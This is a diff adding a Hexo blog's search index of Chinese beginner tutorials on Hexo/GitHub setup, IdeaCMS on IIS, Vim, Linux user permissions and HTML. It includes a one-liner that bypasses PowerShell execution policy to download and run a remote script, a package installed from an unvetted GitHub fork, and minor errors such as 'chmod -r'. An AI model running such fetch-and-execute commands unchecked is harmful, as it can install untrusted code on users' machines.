@@ -1,0 +1,807 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hexo博客搭建</title>
+    <url>/2021/06/10/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%B8%8A%E4%BC%A0%E5%88%B0github%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="Hexo博客搭建"><a href="#Hexo博客搭建" class="headerlink" title="#Hexo博客搭建"></a>#Hexo博客搭建</h1><h2 id="第一步：安装choco工具"><a href="#第一步：安装choco工具" class="headerlink" title="##第一步：安装choco工具"></a>##第一步：安装choco工具</h2><p>进入choco官网：<a href="https://chocolatey.org/">https://chocolatey.org/</a><br>以管理员身份运行终端<br>复制安装命令：<br>Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]: : SecurityProtocol = [System.Net.ServicePointManager]: : SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(‘<a href="https://chocolatey.org/install.ps1&#39;">https://chocolatey.org/install.ps1&#39;</a>))</p>
+<p>检查是否安装成功 命令行输入choco</p>
+<blockquote>
+<p>choco</p>
+</blockquote>
+<p>使用choco 安装Git</p>
+<blockquote>
+<p>choco install git</p>
+</blockquote>
+<p>输入git查看是否安装成功</p>
+<blockquote>
+<p>git</p>
+</blockquote>
+<h2 id="第二步：安装Hexo"><a href="#第二步：安装Hexo" class="headerlink" title="##第二步：安装Hexo"></a>##第二步：安装Hexo</h2><p>打开Hexo官网:<a href="https://hexo.io/">https://hexo.io</a><br>复制安装代码</p>
+<blockquote>
+<p>npm install hexo-cli -g  //使用apm安装Hexo</p>
+</blockquote>
+<p>cd D: [可自己选择盘，此处为演示步骤]   //进入D盘</p>
+<p>hexo init biuergouzi[可自己定义名称，此处为演示步骤] //在目标目录盘，创建一个名为biuergouzi的文件夹</p>
+<p>cd biuergouzi  //进入创建的文件夹</p>
+<p>npm install 使用npm安装所需文件</p>
+<blockquote>
+<p>hexo s（hexo server命令） 查看</p>
+</blockquote>
+<p>浏览器中输入<a href="http://localhost:4000/">http://localhost:4000</a> 查看网页</p>
+<h2 id="第三步：上传至github"><a href="#第三步：上传至github" class="headerlink" title="##第三步：上传至github"></a>##第三步：上传至github</h2><p>1.创建一个github账户<br>2.在github创建一个仓库，仓库名用自己的github名称命名 例如:Biuergouzi.github.io<br>3.在终端中输入-配置本地账户：</p>
+<blockquote>
+<p>git config –global user.name “github的用户名”<br>git config –global user.email “github的邮箱”</p>
+</blockquote>
+<blockquote>
+<p>ssh-keygen -t rsa -C “上面输入的邮箱”  //生成密钥SSH key</p>
+</blockquote>
+<blockquote>
+<p>cat ~/.ssh/id_rsa.pub  //查看SSH key (记录这个key)</p>
+</blockquote>
+<p>4.打开github 点击头像右侧的倒三角 点击settings 设置<br>5.点击左侧栏中的 SSH and GPG keys — 然后点击SSH keys 右侧的新建SSH key  //新建SSH key</p>
+<p>Title： 输入一个名称<br>key：输入之前记录的key<br>点击add SSH key //添加SSH key</p>
+<p>6.终端中输入–安装部署插件：</p>
+<blockquote>
+<p>npm install hexo-deployer-git –save   //安装一个部署插件</p>
+</blockquote>
+<p>7.修改博客的ergouzi文件夹中配置文件<br>在最底下 deploy:<br>        type: git<br>        repository: <a href="https://github.com/[github%E7%94%A8%E6%88%B7%E5%90%8D]/[%E5%88%9B%E5%BB%BA%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D%E5%AD%97].git">https://github.com/[github用户名]/[创建的仓库名字].git</a><br>        branch: master</p>
+<p>8.终端中输入: </p>
+<blockquote>
+<p>hexo g   //重新配置ergouzi文件夹中的文件<br>hexo d  //将本地的文件不输入到github仓库</p>
+</blockquote>
+<p>##第四步：浏览器打开查看博客<br>浏览器中打开链接：[github用户名].github.io</p>
+<p>例如：biuergouzi.github.io</p>
+<h2 id="完成！"><a href="#完成！" class="headerlink" title="##完成！"></a>##完成！</h2>]]></content>
+      <categories>
+        <category>Hexo博客</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows server 2008虚拟机中IdeaCMS网站安装教程</title>
+    <url>/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="IdeaCMS网站安装教程："><a href="#IdeaCMS网站安装教程：" class="headerlink" title="IdeaCMS网站安装教程："></a>IdeaCMS网站安装教程：</h1><p>&lt;!-以下步骤皆为在虚拟机中操作–！&gt; 此教程为已在windows server中安装iis服务</p>
+<h2 id="第一步：下载ideaCMS源码包-导入至Windows-server-2008中"><a href="#第一步：下载ideaCMS源码包-导入至Windows-server-2008中" class="headerlink" title="第一步：下载ideaCMS源码包 导入至Windows server 2008中"></a>第一步：下载ideaCMS源码包 导入至Windows server 2008中</h2><p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619191414428.png" alt="image-20210619191414428"></p>
+<h2 id="第二步解压至C盘目录ideaCMS文件夹中"><a href="#第二步解压至C盘目录ideaCMS文件夹中" class="headerlink" title="第二步解压至C盘目录ideaCMS文件夹中"></a>第二步解压至C盘目录ideaCMS文件夹中</h2><p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192627036.png" alt="image-20210619192627036"></p>
+<h2 id="第三步：打开服务器管理器"><a href="#第三步：打开服务器管理器" class="headerlink" title="第三步：打开服务器管理器"></a>第三步：打开服务器管理器</h2><p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192632075.png" alt="image-20210619192632075"></p>
+<h2 id="第四步：建立网站"><a href="#第四步：建立网站" class="headerlink" title="第四步：建立网站"></a>第四步：建立网站</h2><p>右击网站—点击添加网站—网站名称随意—路径选择之前解压的文件夹</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192637473.png" alt="image-20210619192637473"></p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192644524.png" alt="image-20210619192644524"></p>
+<p>物理路径选择之前解压在C盘的ideacms</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192650308.png" alt="image-20210619192650308"></p>
+<p>最后点击确定按钮</p>
+<h2 id="第五步：配置"><a href="#第五步：配置" class="headerlink" title="第五步：配置"></a>第五步：配置</h2><hr>
+<p>点击ideacms网站—找到ASP配置—找到用父路径将false==&gt;true</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192654230.png" alt="image-20210619192654230"></p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192659606.png" alt="image-20210619192659606"></p>
+<p>找到默认文档配置—添加默认文档—名称填写index.asp </p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192704869.png" alt="image-20210619192704869"></p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192712903.png" alt="image-20210619192712903"></p>
+<p>打开应用程序池—找到ideacms—右击选择高级设置—修改启用32位应用程序为True</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192728052.png" alt="image-20210619192728052"></p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192736905.png" alt="image-20210619192736905"></p>
+<p>在c盘\ideacms\inc文件夹中找到config.asp配置文件—记事本打开编辑</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192809047.png" alt="image-20210619192809047"></p>
+<p>—修改databaseType=“asp”==&gt;databaseType=”sql”—保存并退出文件</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192817390.png" alt="image-20210619192817390"></p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192822505.png" alt="image-20210619192822505"></p>
+<hr>
+<h2 id="第六步：连接数据库"><a href="#第六步：连接数据库" class="headerlink" title="第六步：连接数据库"></a>第六步：连接数据库</h2><p>打开SQL server Management Studio</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192835233.png" alt="image-20210619192835233"></p>
+<p> — 右击数据库—选择新建数据库</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192842744.png" alt="image-20210619192842744"></p>
+<p>—数据库名称填写ideacms</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192853577.png" alt="image-20210619192853577"></p>
+<p>–右击ideacms—任务—导入数据</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192906854.png" alt="image-20210619192906854"></p>
+<p>—数据源选择Mincrosoft Access—文件名浏览c:\ideacm\data*.mdb 文件</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192915852.png" alt="image-20210619192915852"></p>
+<p>然后点击下一步</p>
+<p>—到表和试图的时候 将所有表都选择</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192925767.png" alt="image-20210619192925767"></p>
+<p>—默认下一步—导入成功</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192954843.png" alt="image-20210619192954843"></p>
+<h2 id="第七步：浏览器打开"><a href="#第七步：浏览器打开" class="headerlink" title="第七步：浏览器打开"></a>第七步：浏览器打开</h2><p>在浏览器中输入框中输入虚拟机ip即可打开网页</p>
+<p><img src="/2021/06/10/IdeaCMS%E7%BD%91%E7%AB%99%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/image-20210619192958741.png" alt="image-20210619192958741"></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux中VIM使用教程</title>
+    <url>/2021/06/19/Linux%E4%B8%ADVIM%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="Vim使用："><a href="#Vim使用：" class="headerlink" title="Vim使用："></a>Vim使用：</h1><p><img src="/2021/06/19/Linux%E4%B8%ADVIM%E4%BD%BF%E7%94%A8/image-20210619203205049.png" alt="image-20210619203205049"></p>
+<h3 id="vim-三种编辑模式："><a href="#vim-三种编辑模式：" class="headerlink" title="vim 三种编辑模式："></a>vim 三种编辑模式：</h3><hr>
+<p>Vi/VIM编辑模式：<br>1.命令模式(COmmand mode):<br>“i” 切换到输入模式，然后输入字符<br>“x” 删除当前光标所在处的字符<br>“:　“进入命令模式。已在最后一行输入命令</p>
+<p>2.输入模式(Insert mode)<br>3.底线命令模式(Last linemode)</p>
+<hr>
+<blockquote>
+<p>vi/vim 文件名.txt     &amp;nbsp //编辑当前目录该文件名的文件内容，若该目录无此名文件 则会创建一个文件</p>
+</blockquote>
+<p>进入Vim编辑器后，按”i”,”a”,”o”可进入到输入模式，在编辑模式中，左下角会显示–INSERT–字样，如果需要退出的话，按键盘的”ESC”键退出编辑模式 返回到一般模式。按”:”建 在输入wq即可保存并退出编辑。</p>
+<hr>
+<h3 id="vim的保存退出以及强制保存退出"><a href="#vim的保存退出以及强制保存退出" class="headerlink" title="vim的保存退出以及强制保存退出:"></a>vim的保存退出以及强制保存退出:</h3><blockquote>
+<p>:wq    //保存并退出<br>:q        &amp;nbsp//退出（不会保存）<br>:w        &amp;nbsp//保存<br>:q!    &amp;nbsp //强制退出<br>:w！    &amp;nbsp//强制保存<br>:wq!     &amp;nbsp //强制保存并退出</p>
+</blockquote>
+<hr>
+<table>
+<thead>
+<tr>
+<th>光标移动方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[Ctrl]+[f]</td>
+<td>屏幕[向下]移动一页</td>
+</tr>
+<tr>
+<td>[Ctrl]+[b]</td>
+<td>屏幕[向上]移动一页</td>
+</tr>
+<tr>
+<td>0 / [Home]</td>
+<td>这是数字[0]，移动到这一行的最前面字符处</td>
+</tr>
+<tr>
+<td>$ / [End]</td>
+<td>移动到 这一行的最后字符处</td>
+</tr>
+<tr>
+<td>G</td>
+<td>移动到这个档案的最后一行</td>
+</tr>
+<tr>
+<td>gg</td>
+<td>移动到这个档案的第一行</td>
+</tr>
+<tr>
+<td>n<Enter></Enter></td>
+<td>n为数字，光标向下移动n行</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>搜索替换指令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/word</td>
+<td>向光标往下寻找一个名为word的字符串</td>
+</tr>
+<tr>
+<td>?word</td>
+<td>向光标往上寻找一个名为word的字符串</td>
+</tr>
+<tr>
+<td>n</td>
+<td>这个n是英文按键，代表重复前一个搜寻动作</td>
+</tr>
+<tr>
+<td>N</td>
+<td>这个N是个英文按键，与n相反，为[反向]进行前的一个搜寻动作</td>
+</tr>
+<tr>
+<td>:n1,n2s/word1/word2/g</td>
+<td>n1与n2为数字。在第n1与n2之间寻找word1这个字符串，并将该字符串取代为word2</td>
+</tr>
+<tr>
+<td>:1,$s/word1/word2/g或者:%s/word1/word2/g</td>
+<td>从第一行到最后一行寻找word1字符串，并将字符串代替为word2</td>
+</tr>
+<tr>
+<td>:1,$s/word1/word2/gc或者:%s/word1/word2/gc</td>
+<td>从第一行到最后一行寻找word1字符串，并将字符串代替为word2</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>删除、复制与粘贴方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>x,X</td>
+<td>在一行字当中,x为向后剪切一个字符，X为向前剪切一个字符</td>
+</tr>
+<tr>
+<td>dd</td>
+<td>剪切游标所在的那一整行</td>
+</tr>
+<tr>
+<td>ndd</td>
+<td>n为数字。删除光标所在的向下n行。</td>
+</tr>
+<tr>
+<td>yy</td>
+<td>复制游标所在的那一行</td>
+</tr>
+<tr>
+<td>nyy</td>
+<td>n为数字，复制光标所在的向下n行</td>
+</tr>
+<tr>
+<td>p,p</td>
+<td>p为将已复制的数据在光标下一行贴上，P则为贴在光标上一行</td>
+</tr>
+<tr>
+<td>v</td>
+<td>移动光标选中内容，复制选中内容</td>
+</tr>
+<tr>
+<td>u</td>
+<td>复原前一个动作</td>
+</tr>
+<tr>
+<td>[Ctrl]+r</td>
+<td>重复上一个动作</td>
+</tr>
+<tr>
+<td>.</td>
+<td>这是一个小数点，意思是重复前一个动作的意思</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux用户与用户权限</title>
+    <url>/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h2 id="用户命令"><a href="#用户命令" class="headerlink" title="###用户命令"></a>###用户命令</h2><p>useradd [用户名] //创建用户，同时创建用户组<br>useradd -G [已存在的组] [用户名]  //创建一个用户并加入一个已存在的组<br>useradd [用户名] -s [命令目录]  //手动指定用户登录后使用的shell<br>useradd -M  //创建用户时 不创建用户目录<br>useradd -N  //创建用户时 不创建用户组<br>usermod -g [用户组] [用户名]  //修改用户所在的主要组<br>usermod -G [用户组] [用户名]  //修改用户所在的副要组<br>usermod -l [新用户名] [旧用户名] //修改用户名<br>usermod -L [用户名] //锁一个用户 使其不能使用login登录 但可以在root用户下使用su登录<br>usermod -e [用户名] //修改用户登录有效期<br>usermod -s [shell] //修改用户登录后使用的shell,usermod -s /sbin/nologin 此命令可使账户无法登录<br>usermod -u [uid] //修改用户uid<br>userdel [用户名] //删除一个用户，但不会删除用户目录<br>userdel -r [用户名] //删除用户所有东西，包括用户目录</p>
+<h2 id="用户组命令"><a href="#用户组命令" class="headerlink" title="###用户组命令"></a>###用户组命令</h2><p>groupadd [组名] 创建用户组<br>groupadd -g [组编号] [组名] //创建用户组同时指定编号<br>groupmod -n [新组名] [旧组名] //修改用户组的组名<br>groupmod -g [组编号] [组名] //修改用户组的组编号<br>groupdel [组名] //删除指定用户组</p>
+<h2 id="用户权限命令"><a href="#用户权限命令" class="headerlink" title="###用户权限命令"></a>###用户权限命令</h2><p>权限说明：<br>ls -al 查看当前目录所有文件/文件夹权限</p>
+<p>r=读;  r=4  //读权限使文件可被读，例cat、more命令<br>w=写; w=2 //写权限使文件/文件夹可被改写,例echo、mv、vi等命令<br>x=执行;x=1 //执行权限使文件可被执行或者文件夹进入，例cd命令</p>
+<p>权限：rwx rwx rwx<br>分为三组 一组为三个<br>第一组：用户权限  第一组英文字母为u<br>第二组：用户组权限 第二组英文字母为g<br>第三组：其他用户权限 第三组英文字母为o<br>英文字母a代表all 表示三组全选</p>
+<p>Chmod命令：<br>chmod 755 a //修改a文件的权限为755=rwx r-x r-x<br>chmod a+x a //修改a文件中的所有权限 加上执行权限<br>chmod -r //递归修改权限</p>
+<p>chown命令：<br>chown root: root a //修改a文件的用户权限以及用户组权限为root<br>chown root: zhangsan a //修改a文件的用户权限为root,用户组权限为zhangsan<br>chown : root a //只修改a文件的用户组为root<br>chown -r  //递归修改</p>
+<p>各个信息代表的含义图解：</p>
+<p><img src="/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/image-20210619193139915.png" alt="image-20210619193139915"></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo文章本地图片插件</title>
+    <url>/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="一、安装插件与修改配置文件"><a href="#一、安装插件与修改配置文件" class="headerlink" title="一、安装插件与修改配置文件"></a>一、安装插件与修改配置文件</h2><hr>
+<p>npm install <a href="https://github.com/7ym0n/hexo-asset-image">https://github.com/7ym0n/hexo-asset-image</a> –sa &nbsp;&nbsp;//修改过的插件，原本的插件有Buf，这个已经经过修改 安装后就无需修改了。</p>
+<hr>
+<p>打开hexo博客根目录的配置文件’_config.yml’ 修改为以下内容</p>
+<hr>
+<p>post_asset_folder: false ==&gt; true</p>
+<hr>
+<h2 id="二、创建文章"><a href="#二、创建文章" class="headerlink" title="二、创建文章"></a>二、创建文章</h2><p>进入hexo博客文章目录中，在当前目录打开终端/cmd</p>
+<blockquote>
+<p>hexo new “文章名” &nbsp;&nbsp; //创建一个文章</p>
+</blockquote>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619214015237.png" alt="image-20210619214015237"></p>
+<p>创建完成后，会在文章目录中创建一个与文章名相同的文件夹</p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619214210166.png" alt="image-20210619214210166"></p>
+<p>这个文件夹就是用来放图片的文件夹</p>
+<h2 id="三、修改Typora偏好设置"><a href="#三、修改Typora偏好设置" class="headerlink" title="三、修改Typora偏好设置"></a>三、修改Typora偏好设置</h2><p>打开Typora，点击左上角文件—点击偏好设置</p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619214330935.png" alt="image-20210619214330935"></p>
+<p>在偏好设置中点击–图像</p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/Users\Biu二狗子\AppData\Roaming\Typora\typora-user-images\image-20210619214455678.png" alt="image-20210619214455678"></p>
+<p>将无特殊操作修改为复制到指定路径，然后将【对本地位置的图片应用上述规则】以及【优先使用相对路径勾上】</p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619214700657.png" alt="image-20210619214700657"></p>
+<h2 id="四、插入图片-截图"><a href="#四、插入图片-截图" class="headerlink" title="四、插入图片/截图"></a>四、插入图片/截图</h2><p>将图片放入文件夹中，在文章内容中输入</p>
+<hr>
+<p><img src alt="描述文字"></p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619215455695.png" alt="image-20210619215455695"></p>
+<hr>
+<p>第二种放入截图的方式就十分简单了</p>
+<p>使用截图工具 QQ或者微信的都可以，截图后直接复制到文章内，会自动添加图片到文件夹中</p>
+<p><img src="/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/image-20210619215619487.png" alt="image-20210619215619487"></p>
+<p>这样就可以正常使用了~</p>
+]]></content>
+      <categories>
+        <category>Hexo博客</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML学习总结</title>
+    <url>/2021/06/16/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>HTML   超文本标记语言</p>
+<pre><code>    HTML是一种用于创建网页的标准标记语言。
+
+   您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。
+</code></pre>
+<p>《!– more –》</p>
+<p>HTML head 元素</p>
+<pre><code>    《head》 元素包含了所有的头部标签元素。在 《head》元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
+
+    可以添加在头部区域的元素标签为: 《title》, 《style》, 《meta》, 《link》, 《script》, 《noscript》 和 《base》。
+</code></pre>
+<p>HTML title 元素</p>
+<pre><code>《title》 标签定义了不同文档的标题。
+《title》 在 HTML/XHTML 文档中是必须的。
+</code></pre>
+<ul>
+<li>定义了浏览器工具栏的标题</li>
+<li>当网页添加到收藏夹时，显示在收藏夹中的标题</li>
+<li>显示在搜索引擎结果页面的标题</li>
+</ul>
+<p>HTML《meta》元素</p>
+<p>meta标签描述了一些基本的元数据。</p>
+<p>《meta》 标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。</p>
+<p>META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p>
+<p>元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</p>
+<p>《meta》一般放置于《head》区域</p>
+<p>为搜索引擎定义关键词:</p>
+<pre><code>《meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;》
+</code></pre>
+<p>为网页定义描述内容:</p>
+<pre><code>《meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;》
+</code></pre>
+<p>定义网页作者:</p>
+<pre><code>《meta name=&quot;author&quot; content=&quot;Runoob&quot;》
+</code></pre>
+<p>每30秒钟刷新当前页面:</p>
+<pre><code>《meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;》
+
+《!DOCTYPE html
+《html》
+    《!-- 头部标签 --》
+   《head》
+       《meta charset=&quot;utf-8&quot;》 
+       《!--描述了文档的标题--》
+       《title》HTML《/title》
+   《/head》
+    《!-- 页面标签 --》
+    《body》
+        
+    《/body》   
+《/html》
+</code></pre>
+<p>HTML 标题</p>
+<p>HTML 标题（Heading）是通过《h1》 - 《h6》 标签来定义的。</p>
+<pre><code>《h1》
+    这是一个一级标题
+《/h1》
+《h2》
+    这是一个二级标题
+《/h2》   
+《h3》
+    这是一个三级标题
+《/h3》    
+</code></pre>
+<p>HTML 段落</p>
+<p>HTML 段落是通过标签 《p》 来定义的。</p>
+<pre><code>《p》这是一个段落。《/p》
+</code></pre>
+<p>HTML 链接</p>
+<p>HTML 链接是通过标签 《a》 来定义的。</p>
+<p>使用 target 属性，你可以定义被链接的文档在何处显示。</p>
+<p>href=”这是路径”。</p>
+<pre><code>《a href=&quot;https://www.feixiangzai98.com&quot; target=&quot;_blank&quot;》这是一个链接《/a》
+</code></pre>
+<p>HTML 图像</p>
+<p>HTML 图像是通过标签 《img》 来定义的.</p>
+<p>src=”这里是路径”，width=”258”,height=”39”,这两个属性是设置图片属性。</p>
+<p>alt 属性用来为图像定义一串预备的可替换的文本。</p>
+<p>替换文本属性的值是用户定义的。</p>
+<pre><code>《img loading=&quot;lazy&quot; src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; alt=&quot;this picture&quot;/》
+</code></pre>
+<p>HTML 换行</p>
+<pre><code>《/br》
+</code></pre>
+<p>HTML 水平线</p>
+<pre><code>《/hr》
+</code></pre>
+<p>HTML 注释</p>
+<pre><code>《!-- 这是一个注释  --》
+</code></pre>
+<p>HTML 《link》元素</p>
+<p>《link》 标签定义了文档与外部资源之间的关系。</p>
+<p>《link》 标签通常用于链接到样式表:</p>
+<pre><code>《head》
+《link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;》
+《/head》
+</code></pre>
+<p>HTML 《style》 元素</p>
+<p>《style》 标签定义了HTML文档的样式文件引用地址.<br>在《style》 元素中你也可以直接添加样式来渲染 HTML 文档</p>
+<pre><code>《head》
+《style type=&quot;text/css&quot;》
+body &#123;background-color:yellow&#125;
+p &#123;color:blue&#125;
+《/style》
+《/head》
+</code></pre>
+<p>HTML 《script》 元素</p>
+<p>《script》标签用于加载脚本文件，如： JavaScript。</p>
+<p>《script》 元素在以后的章节中会详细描述。</p>
+<pre><code>《script src=&quot;引用位置&quot;》《/script》
+</code></pre>
+<p>HTML 表格</p>
+<pre><code>《!-- 这定义了一个表格 --》
+《table border=&quot;1&quot;》
+    《!-- 表格的行 --》
+   《tr》
+       《th》表格的表头《/th》
+    《/tr》
+    《tr》
+        《td》表格的单元格《/td》
+    《/tr》
+</code></pre>
+<p>​<br>​<br>​    《/table》</p>
+<p>HTML 列表</p>
+<p>HTML无序列表</p>
+<p>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。</p>
+<p>无序列表使用 《ul》 标签</p>
+<pre><code>《ul》
+《li》Coffee《/li》
+《li》Milk《/li》
+《/ul》
+</code></pre>
+<p>HTML 有序列表</p>
+<pre><code>    同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 《ol》 标签。每个列表项始于 《li》 标签。
+</code></pre>
+<p>列表项使用数字来标记。</p>
+<pre><code>《ol》
+《li》Coffee《/li》
+《li》Milk《/li》
+《/ol》
+</code></pre>
+<p>HTML 区块元素</p>
+<p>HTML 《div》 元素</p>
+<p>HTML 《div》 元素是块级元素，它可用于组合其他 HTML 元素的容器。</p>
+<div> 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。
+
+<p>如果与 CSS 一同使用，《div》 元素可用于对大的内容块设置样式属性。</p>
+<pre><code>《div》
+</code></pre>
+<p>​<br>​    《/div》</p>
+<p>HTML 《span》 元素</p>
+<p>HTML 《span》 元素是内联元素，可用作文本的容器</p>
+<p>《span》 元素也没有特定的含义。</p>
+<p>当与 CSS 一同使用时，《span》 元素可用于为部分文本设置样式属性。</p>
+<pre><code>《span》   《/span》
+</code></pre>
+<p>实例</p>
+<pre><code>《!DOCTYPE html》
+《html》
+《head》 
+《meta charset=&quot;utf-8&quot;》 
+《title》feiixang(runoob.com)《/title》 
+《/head》
+《body》
+ 
+《div id=&quot;container&quot; style=&quot;width:500px&quot;》
+ 
+《div id=&quot;header&quot; style=&quot;background-color:#FFA500;&quot;》
+《h1 style=&quot;margin-bottom:0;&quot;》主要的网页标题《/h1》《/div》
+ 
+《div id=&quot;menu&quot; style=&quot;background-color:#FFD700;height:200px;width:100px;float:left;&quot;》
+《b》菜单《/b》《br》
+HTML《br》
+CSS《br》
+JavaScript《/div》
+ 
